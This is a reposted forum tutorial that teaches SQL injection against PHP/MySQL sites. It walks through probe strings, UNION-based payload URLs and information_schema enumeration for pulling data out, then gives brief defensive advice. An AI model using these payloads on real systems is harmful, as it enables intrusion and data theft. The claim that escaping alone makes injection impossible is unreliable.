This tutorial was originally posted on Evilzone.org by ande.

In this tutorial


1.0 What is SQL?
1.1 Types of SQL or SQL engines
1.2 Understanding the SQL structure
1.3 Finding vulnerabilities
1.4 Exploiting vulnerabilities
1.5 Securing vulnerabilities

1.0 What is SQL?

SQL stands for Structured Query Language. It is a way to store, modify and update data secure, fast and reliable.

SQL is mostly used for web sites but can however be used for almost any application and or service which is in need of storing, editing and or updating data in a good and structured way.

In this tutorial I will be using PHP as script language for examples. PHP is a web script engine. Its the most widely used one, its the best one and its the one you are most likely to encounter in real life scenarios. Now, you might think; 
But if I only learn this on one type of script, don't I have to learn all of this for all other types of scripts?(ASP, ASP.NET, Java, Perl, CGI, [...])

No, you don't. The concept remains the same. However, to truly understand SQL injection on various script types, I encourage you and recommend you from the bottom of my heart to learn the languages. You don't have to learn them all, but perhaps the top 3 most used or something like that. At least PHP.

Additionally I will be using MySQL as the SQL engine in examples.

Theoretically SQL can be used by any script engine as it is basically just a application listening on a port on a server waiting for commands/instructions. The only requirement is the ability to use TCP/IP protocol. However some script engines like PHP and ASP(.net) got pre-made classes and functions for some of the most common SQL engines. Making it a whole lot easier to interact with the SQL server.

In order to run PHP scripts(at least in a browser) you are going to need a PHP supported web server. It is not required to write a single line of code or install anything on your computer to complete this tutorial. But its a good idea to experiment with all of the elements in this tutorial. PHP, MySQL and web server(I recommend apache).


Learn more about PHP: http://php.net | http://en.wikipedia.org/wiki/PHP
Learn more about SQL: http://en.wikipedia.org/wiki/SQL
Learn more about MySQL: http://mysql.com | http://www.tizag.com/mysqlTutorial/ | http://en.wikipedia.org/wiki/MySQL
Learn more about Apache: http://en.wikipedia.org/wiki/Apache_HTTP_Server

PS. If you want a really quick way of installing all of the elements above, install WAMP for Windows. Its a all-in-one Apache, MySQL and PHP system for Windows. Alternatively, here is a guide to setup Apache + PHP, but no MySQL: http://evilzone.org/web-oriented-program...vironment/ In this case you will have to install MySQL for yourself, which can be a bit hard if you are a beginner.



1.1 Types of SQL or SQL engines

There are many different variations of SQL. Most of the coming from different companies, some are free some are not. Some are open source, and some are not. Its like everything else really.

Some of the different SQL engines are:
Oracle
MSSQL
MySQL
PostgreSQL
I personally use MySQL because its free and works well with Apache and whatnot. It also got a good syntax. It is also the most used engine so its what you will most likely encounter when doing injections. All SQL in this tutorial will be MySQL.

Learn more about MySQL: http://mysql.com | http://www.tizag.com/mysqlTutorial/ | http://en.wikipedia.org/wiki/MySQL



1.2 Understanding the SQL structure

The structure of SQL is divided into; Servers, databases, tables, columns and rows.

A SQL server is a software running on a computer waiting for commands from console or over the internet(or localhost/lan).

A SQL server consists of databases and can contain as many databases as you want.

A database consists of tables.

A table consists of columns and rows.


Here at Evilzone we use a local SQL server.

One of our databases(A SMF forum database) contains these tables:
Quote:
smf_attachments
smf_ban_groups
smf_ban_items
smf_boards
smf_board_permissions
smf_calendar
smf_calendar_holidays
smf_categories
smf_collapsed_categories
smf_log_actions
smf_log_activity
smf_log_banned
smf_log_boards
smf_log_errors
smf_log_floodcontrol
smf_log_karma
smf_log_mark_read
smf_log_notify
smf_log_online
smf_log_polls
smf_log_search_messages
smf_log_search_results
smf_log_search_subjects
smf_log_search_topics
smf_log_topics
smf_membergroups
smf_members
smf_messages
smf_message_icons
smf_moderators
smf_package_servers
smf_permissions
smf_personal_messages
smf_pm_recipients
smf_polls
smf_poll_choices
smf_sessions
smf_settings
smf_smileys
smf_themes
smf_topics

The table smf_members will most likely contain information about all the members on the forum. A few of the columns smf_members contains:
Quote:
ID_MEMBER
memberName
dateRegistered
posts
realName
ICQ
AIM
YIM
MSN
avatar
karma
Now a row is one line with all these columns. Ill try to show you with a little ASCII awesomeness here.

This entire thing is a table:
______________________________________________________
|____ID_____|___Name_____|____Pass___|______Email_______|
|_____0_____|____ande____|___abcgefg__|__abc@gmail.com___|
|_____1_____|___satan911_ |___abcgefg__|__abc@gmail.com___|
|_____2_____|___abcgefg__ |___abcgefg__|__abc@gmail.com___|
|_____3_____|___abceqfg__ |___abcgefg__|__abc@gmail.com___|
|_____4_____|___affdeqfg__ |___abcgefg__|__abc@gmail.com___|
|_____5_____|___abhhefg__ |___abcgefg__|__abc@gmail.com___|
|_____6_____|___abaaefg__ |___abcgefg__|__abc@gmail.com___|
|___________|____________|___________|_________________|

In this table the fields ID, Name, Pass and Email are columns. The items downwards are rows.

Row1:
|_____0_____|____ande____|___abcgefg__|__abc@gmail.com___|

Row2:
|_____1_____|___satan911_ |___abcgefg__|__abc@gmail.com___|

Row3:
|_____2_____|___abcgefg__ |___abcgefg__|__abc@gmail.com___|

And so on...

Thats pretty much it really. Takes a few brain fluxuations before you will memorize this on your own. Remember:
Server(s)->Databases->Tables->Columns and rows



1.3 Finding vulnerabilities

Before moving on now, it is a GOOD idea for you to learn the basics about both PHP and MySQL(at least look up some code), it is not required to be able to perform SQL injections, however. You will find it much easier to perform more advance injections later on(And you will actually understand what the fuck is going on behind the scenes!). I will also do this tutorial by showing the server side code in PHP and MySQL.


Okay, our target! http://evilzone.org!

Lets now try to find a page where our target(http://evilzone.org) uses SQL with user inputs.
So you are browsing around on the page. You find these links:

http://evilzone.org/index.php?id=17 (shows an article)
http://evilzone.org/index.php?page=contact (shows a contact form)
http://evilzone.org/contact.php?do=submit (you come to this link when you click send on contact form)

Okay, the most common use of SQL is when looking for things like articles, posts, threads, comments, user information, product information and so on.

The link index.php?page=contact is probably not SQL based because its not normal to load entire pages from SQL(can be done tho), this link is more likely to be vulnerable to RFI or LFI. But you should still try it nonetheless.

The link index.php?do=submit might contain SQL however, then it is most likely a POST SQL injection, which I wont cover in this tutorial. Its very normal to save this kind of information in SQL.

Now! The link index.php?id=17! This link almost certainly uses SQL. This is a very common thing to use SQL for.

The SQL query for this case would look a lot like this:
Code:
SELECT * FROM articles WHERE id='17'
What this does is, it asks the SQL server for all data(*) where the article's ID = 17.

Lets say the article table got a ID, subject and text column. The SQL server will then return the id, subject and text data from the table 'articles' where ID is equal to 17.

This is the normal way. This is what it does if a normal user browses the page. However, what if we...

Lets try to add a ' to the end of the link so the link becomes http://evilzone.org/index.php?id=17'

Now the SQL query would look something like this:
Code:
SELECT * FROM articles WHERE id='17''

This wont work very well, two 's? The SQL server doesn't understand this so it will now return an error message instead of the data of the article it normally would.

So the page will now output something like this(where the article used to be):
Code:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 Error no:xxxx

Now, if you are not getting such an error message(any error message is good, doesn't need to be 100% like the one above.), but you are getting a blank page(either in form of a totally white blank page or a page with no content at the places where there used to be content without the error prefix(')). No worries. It can still be vulnerable. In a lot of cases, the page wont return any error messages, but there can still be an error behind the scenes. Which means its still vulnerable. Additionally, the ' character is not always the right one to use or is enough to cause an error. Further testing is required to determine if the target is vulnerable.

On top of that. Sometimes, instead of displaying an error message or a blank page, it can do things like redirecting to the main page or something similar.

If you are getting an error message you can jump to the next chapter(1.4 Exploiting vulnerabilities). I do however, recommend reading this chapter done tho. Up to you. You should know what to do when no error message appears Wink 

To determine if a target is vulnerable when it does not output any error message from just adding a ' to the link you need to first try some other characters, if still no error message you need to try a few other techniques. Continue reading.

Other error prefixes( like the ' ) are:
Quote:
\
/*
'/*
"/*
'--
"--
';
";
--
;
If none of the above characters create an error, I highly doubt you will ever get one. Lets move on to some other techniques.

If you are getting a blank page(either a totally white one or a page with no content where it used to be content without any error prefix). We need to try to "join" the query instead of creating an error. You can do this in a few different ways. Here are the ones I recommend:
Quote:
+order+by+99999
+or+1=2
+and+1=2
Don't mind the + sign, its the equivalent to a space, but if you put a space in your URL, it will become %20, which is a lot harder to read than +.

Now, you use the 3 query injections like this:
Using +order+by+x
The whole point here is to see if we can order the result by a something.
First, take your URL:
index.php?id=17
Then just try adding +order+by+1
If the page now returns normally, try adding +order+by+99999
If the page now does not load normally, you might have vulnerable page.
Explanation:
+order+by+1 will order the returning results from the MySQL server by column 1. The column 1 must exist because a table cannot have 0 columns. But the +order+by+99999 will try to order the results by column nr 99999. This column cannot possibly exist, because that way over the maximum possible columns in a table. Therefor, this should create an error(or return nothing).

Additionally, you should try the exact same procedure as above just with adding /* and '-- after the +order+by+x in combination with adding ' and " before +order+by+x
Examples:
'+order+by+1
"+order+by+1/*
'+order+by+1'--
+order+by+1/*
[...]

Using +or+x=x
The whole point here is to see if we can trick the SQL server into making a question true no matter what.
First, take your URL:
index.php?id=17
then change the number(or whatever your URL have as value) into something completely different from its original value. Because this is a number, we will change it into -1. Most likely the SQL server does not got a article with the ID -1
Our URL now looks like this:
index.php?id=-1
Then just try adding +or+1=1
If the page now returns normally, try adding +or+1=2
If the page now does not load normally, you might have vulnerable page.
Explanation:
+or+1=1 will always return true. In this example with the query I showed you above this will make the entire query something like this:
Code: [Select]
SELECT * FROM articles WHERE id='-1' or 1=1

So, the SQL server will return all articles where 1=1! This also means you will most likely not the get same article you got the first time, but rather the first article in the database. Or you will get all articles on the same page. nonetheless, we got ourselfs a vulnerable page!

Additionally, you should try the exact same procedure as above just with adding /* and '-- after the +or+1=1 in combination with adding ' and " before +or+1=1. Also try 'a'='a and "a"="a instead of 1=1 (yes without the last ' and ")
Examples:
'+or+1=1
'+or+'a'='a
+or+1=1/*
[...]

Using +and+x=x
The whole point here is to set another condition in the query to see if we can affect the query at all.
First, take your URL:
index.php?id=17
Then just try adding +and+1=1
If the page now returns normally, try adding +and+1=2
If the page now does not load normally, you might have vulnerable page.
Explanation:
+and+1=1 will set another requirement in the query. The query will become like this:
Code: [Select]
SELECT * FROM articles WHERE id='17' and 1=1

But when you put +and+1=2 the query becomes like this:
Code: [Select]
SELECT * FROM articles WHERE id='17' and 1=2

This will of course never be true, because 1 will never be equal to 2. So, if you are able to set your own requirements in the query, we can also do an information retrieval injection, which in the end is what SQL injection is all about. Getting information you are not supposed to.

Additionally, you should try the exact same procedure as above just with adding /* and '-- after the +and+x=x in combination with adding ' and " before +and+x=x. Also try 'a'='a and "a"="a instead of 1=1 (yes without the last ' and ")
Examples:
'+and+1=1
'+and+1=1/*
"+and+'a'='a
'+and+"a"="a
[...]


If you after using at least one of the above techniques got no indications that the page could be vulnerable. It probably is not vulnerable. Find a new URL!

PS: If you actually learn MySQL syntaxes and SQL logic you wont have to do as much trial and error as I have described in the techniques above. You will understand how/why the different prefixes does and when they are necessary/required/possible.



1.4 Exploiting vulnerabilities

Once you have found a vulnerable link it is pretty straight forward. (Well, can be at least. Your injection could be blind and that will make your life a lot harder. Blind injections are NOT covered in this tutorial.)

Just a quick description of blind SQL injection(Credits to owasp.org)
Quote:
Overview When an attacker executes SQL Injection attacks, sometimes the server responds with error messages from the database server complaining that the SQL Query's syntax is incorrect. Blind SQL injection is identical to normal SQL Injection except that when an attacker attempts to exploit an application, rather then getting a useful error message, they get a generic page specified by the developer instead. This makes exploiting a potential SQL Injection attack more difficult but not impossible. An attacker can still steal data by asking a series of True and False questions through SQL statements.

Back to our vulnerable link. It is a good idea to try to visualize what the SQL query looks like. In this case it is pretty easy. But in more advance injections this really helps out.

So again, the query looks like this:
Quote:
SELECT * FROM articles WHERE id='ID'<-INJECTION GOES HERE

The first thing we need to do is find out how many column it is in the table 'articles'. This is because we are going to use the UNION ALL SELECT command. What this UNION ALL SELECT command does is that it allows you to SELECT something in the database two times within the same query, it will then return the data of both the SELECT commands as if it was one query.

So.. In this case we know that the table got 3 columns(ID, subject, text). If we don't know this, there are two things you can do.

You can do it by using the ORDER BY command or you can just try it out to your query works. However, I would normally go for the ORDER BY command as this does not create lots of nasty logs and its faster if its more than 5 columns or so.

The ORDER BY command does exactly what it sounds like. It orders things alphabetically, numeric or by date/time. It can order by name or offset of a column. That means you can do ORDER BY ID or ORDER BY 1, this will be the same if the column ID is the first column.
That again means that we can find out how many columns the table got by trying to order by offsets until we get a error or blank page starting at something like 5. So here we go:

TIP: Use + instead of space, makes it much cleaner.

http://evilzone.org/index.php?id=17+ORDER+BY+5 : Returns blank page
http://evilzone.org/index.php?id=17+ORDER+BY+2 : Returns normal page
http://evilzone.org/index.php?id=17+ORDER+BY+4 : Returns blank page
http://evilzone.org/index.php?id=17+ORDER+BY+3 : Returns normal page

Okay, so 4 is to high and 2 is to low because 3 obviously worked. Now we know the table got 3 columns!


Now we are almost ready to start getting some juicy data. But I have kinda cheated for you guys. Because normally we don't know what the names of the columns are, I just said they are named ID, subject and text. So we need to look this up.

Before we can look up what the column names are, we need to find out what version of MySQL the server are running. Newest one are 5.*** and the one you MIGHT come by is 4.***

We can use the UNION ALL SELECT command already, however its pointless for data extraction without the column names(actually its not even possible). But we can get the version without the names.

This is what you need to do now:

http://evilzone.org/index.php?id=17+UNIO...LECT+1,2,3

There we go, now we used the UNION ALL SELECT command. We do 1,2,3 because it is 3 columns. If it was 5 you will have to do 1,2,3,4,5 and so on...

The page now should/may output "2" as subject and "3" as the article text. 1 is should not be there because the ID is probably not printed to the page. If the page outputs "2" and "3", then great! Skip past the next text block. If not read this;

The UNION ALL SELECT doesn't replace the first SELECT so in some cases(depending on the PHP code) we have to cause an select that will select nothing first. What we can do then is put something like 99999 instead of 17. This will return nothing because article NR 99999 doesn't exist(just make sure 99999 really does not exist :P ). But the union all select will return 1,2,3 and this will be printed to the page instead.



Our page now outputs "2" as subject and "3" as article text. We can now find out what version they are running. This is how you do that:

http://evilzone.org/index.php?id=17+UNIO...,@@version

Now the text("3") will be replaced with the information about what version they are running.


If the version query returns as 5.*** then you can skip the next block of text, if it returns 4.*** read this;

In the MySQL version V4 they did not have the database called 'information_schema' which in V5 contains all information about all tables and columns(names, ids and more). That means, in V4 it is impossible to find out the table and column names, the only way to then get any data out is by guessing the table/column names which is time consuming and may create a lot of logs... If you wish to continue the injection, you should read through the rest and then understand how to guess the names. There are programs to brute force the table and column names.
-------------------------------------------

Okay, before we continue now. I just want to get something of my heart. If you are getting errors from even trying to UNION ALL SELECT anything. And are either getting error messages that says something like "wrong type" or something like that, or are just getting blank page/redirection: If the table of the first SELECT command in a query you are trying to UNION ALL SELECT is built in such a way that, lets say the first two columns are set to be numbers, and the last one is set to be a text value(I am using 3 columns because thats what we are dealing with here). You have to follow that pattern in the UNION ALL SELECT command too. So if the first SELECT is 2x columns of type number and then a text column, your UNION ALL SELECT command have to be alike(UNION ALL SELECT 1,2,'text'). Which means for us that we cannot use the 2 number in the query to get text information from the SQL server. But we will continue this tutorial as if the columns we are using wont create any errors.


We can now "ask" the database 'information_schema' for the column names. The 'information_schema' database contains a table called 'tables' and a table called 'columns'.

The table 'tables' inside the database information_schema contains information about all the tables within all the databases on the server. So to find table names you can "ask" the table 'tables' in the database 'information_schema'.

The table 'columns' in the database 'information_schema' contains information about all the columns inside all the tables in all the databases on the server. So to get column names you can "ask" the table 'columns' in the database 'information_schema'.

Note: The table 'columns' in 'information_schema' also contains table names, therefore we can get both column and table names with one query if we want to.


But before we can ask the 'column' table for column names we need to know what table we want to extract information from.

You do that by asking the table 'tables' in the database 'information_schema' for table names. But when doing this without any more requirements than just "give me everything" to the SQL server, it will return ALL table names in the entire server. And that can be a lot on large servers. So.. We need to specify our question to the table a bit better.

To get all table names in a specific database you do this:
Code:
http://evilzone.org/index.php?id=17+UNION+ALL+SELECT+1,2,concat(table_name)+FROM+information_schema.tables+WHERE+table_schema='DatabaseName
This will ask the table 'tables' in 'information_schema' for all table names where the database name is 'DatabaseName'. Remember, databases consists tables, so each table will always have a owner database. To ask it for all table names in the current database, the one already used by the original query you do this:
Code:
http://evilzone.org/index.php?id=17+UNION+ALL+SELECT+1,2,concat(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()

The variable database() represents the database in use by the first SELECT command in the query.

TIP: schema means database


Again, before we continue now. I have to make an important note. If your injections are failing when you have 's or "s in them, you have to convert your arguments to HEX. A lot of things in MySQL can be represented at HEX instead. When you want to represent things as HEX you simply remove the 's or "s and put 0xHEX_NMBERS instead. The 0x will indicate to the MySQL server that the value is a HEX string. Here is the above link that contained 's in HEX version:
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...654e616d65

An excellent online text to HEX converter: http://www.string-functions.com/string-hex.aspx


Continuing...
Now, where the number "3" or where originally the article text was it should now be a table name.

Lets say this database contains the tables:
Quote
articles
users
log

Then you should see 'articles' because it is the first table. Okay, so we know the database got a table called 'articles', lets check that one out.

Now we need to get the column names for the table 'articles'.
To get the column names of a table you do this:
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...'articles'

Note the 's in the query, remember what I wrote about 's and HEX.

Okay, lets break it down a bit. Now we have used the UNION ALL SELECT command and we asked the database 'information_schema' if it got a table called 'columns', and it did, so we asked the table 'columns' if it could give us all the names of the columns in the table called 'articles'

BTW, the concat() will return everything inside it as a merged value. Example:
concat('h', 'e', 'll', 'o') will return hello. Concat() is not needed in this query but its a good idea to learn how to use it, as you will need it later.

The place where the number "3" used to be or the place where the article text is when using the page normally should now have a name in it. In this case it should have the value 'ID'. This is because the column name 'ID' is the first column in the table 'articles'.

So now we know one of the column names in the table. To get the rest we have to use the LIMIT command. The LIMIT command will return a limited/selected amount of rows from a table.

Example:
We got a table with only one column, the column is called ID. We got 10 rows:
____
|ID_|
|_1_|
|_2_|
|_3_|
|_4_|
|_5_|
|_6_|
|_7_|
|_8_|
|_9_|
|_10|

If we do:
Code: [Select]
SELECT * FROM TheTableAbove LIMIT 0,5

It will return the row 1 to 5

If we do:
Code: [Select]
SELECT * FROM TheTableAbove LIMIT 5,5

It will return the row 5 to 10


Now, back to getting the column names. Lets try to get column name NR 2, NR 1 is 'ID', we got that from the previous query.
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...+LIMIT+1,1

This should return the name 'subject'. This is because the columns 'subject' is columns NR 2. So by limiting the result from result 1(0 is the first) and then give us the next 1 result(s) we get 'subject'.

To get the last column name we limit it 2,1.
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...+LIMIT+2,1

This should return 'text'. Again this is because we now are limiting the results from the server by row NR 2 and asks for the 1 next result(s).



Alright, so the situation is:

We want to check out a table called 'articles'.
We got the table name from asking the table 'tables' in the database 'information_schema'

The table 'articles' got these columns:
ID | subject | text

We got the column names from asking the table 'columns' in the database 'information_schema' for all column names in the table 'articles'

Now! All we need to do is extract what we want. All through this table 99% likely is not interesting at all we now are gonna try to extract all the info out of article NR 23, this is because we act like that article is for admins only, but we want to read it anyway.

To extract information you do like this:
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...concat(ID, subject, text)+FROM+articles+WHERE+ID=23

Now you will see a almost normal looking article, however the subject will still be “2”. But the text will now look like this(Lets say that the subject is “admin passwords” and the text is “abcabcabc”): 
Quote
23admin passwordsabcabcabc

This is because we asked for the ID which is 23, then the subject which is "admin passwords" and then the text which is "abcabcabc".

This is a bit messy.. So lets try to clean things up by splitting the 3 columns with a '<br /><br />':
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...ID,'&lt;br /><br/>',subject,'<br /><br />',text,'<br /><br />')+FROM+articles+WHERE+ID=23
(Remember the HEX thing? Most likely you will have to use that here.) HEX version:
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...HERE+ID=23



Now you will see this:
Quote
23

admin passwords

abcabcabc



I know this information wasn't all that interesting but this is basically how you do it!

Lets say you want to check if the database got a user information table. Then you simply use the limit command on the:
Quote
http://evilzone.org/index.php?id=17+UNIO...abaseName'
OR
Quote
http://evilzone.org/index.php?id=17+UNIO...database()

And repeat the whole process all over again.




Okay. I have a confession to make. The method you guys learned now is the very hard way. But I wanted you to know how to do it that way because sometimes its necessary. And I know you would have just skipped to the easy version if I told you earlier :P 

To now we have used the concat() function to group up different columns into one. But this does not limit the amount of rows the SQL server returns. So (depending on the PHP code) we will only get the first row of the returned results printed to the page. Depending on the PHP code, if it is coded in such a way that it will only output the first row or if it will loop thought all the rows and print them out.

Either way, I will introduce you to a new function. The group_concat() function. This will not only allow you to group up multiple columns and values into one, but also grouping up rows so you don't have to use the LIMIT at the end and send a million requests.

However, I must warn you. The group_concat default max length is only 1024 characters. Thats why its very often necessary doing it the hard way, with LIMIT. If the returned value is more than 1024 characters the rest will just be discarded. nonetheless. This is how you do it:

Remember the 'article' table from above? Well, lets try getting all its column names from the 'information_schema.columns' instead of doing LIMIT:
Code: [Select]
http://evilzone.org/index.php?id=17+UNIO...'articles'

This should now return as:
Quote
ID,subject,text

Now we have gotten the same amount of information that we had to send three requests for last time in one request! This method can be used in all the other queries above to.



1.5 Securing vulnerabilities

What every PHP coder(and any other web page coder) should ALWAYS do: strip/check/secure ALL user inputs!

Instead of doing:
Code: [Select]
$variable = $_GET['Some_user_input_name'];

Do:
Code: [Select]
$variable = mysql_real_escape_string($_GET['Some_user_input_name']);

The mysql_real_escape_string() function will prohibit any escape character (' or " or \ etc) to do any damage. And therefore an injection is impossible.

And remember to use ' around the variable like this:
Code: [Select]
db_query("SELECT * FROM Somewere WHERE Something='".$variable."');


Use of the is_numeric() function where the inputs are always going to be numbers either way is also a good idea. And also check the number length, your number should never be so high that it stats using e's (51.315+315e). So a simple if (num > 99999999999) {die;} will work fine.

Other inputs are:
Quote
$_POST['']
$_COOKIE['']
$_FILES['']
$_REQUEST['']
$_SESSION['']

It is so god damn easy so why people do not do it is a mystery to me.
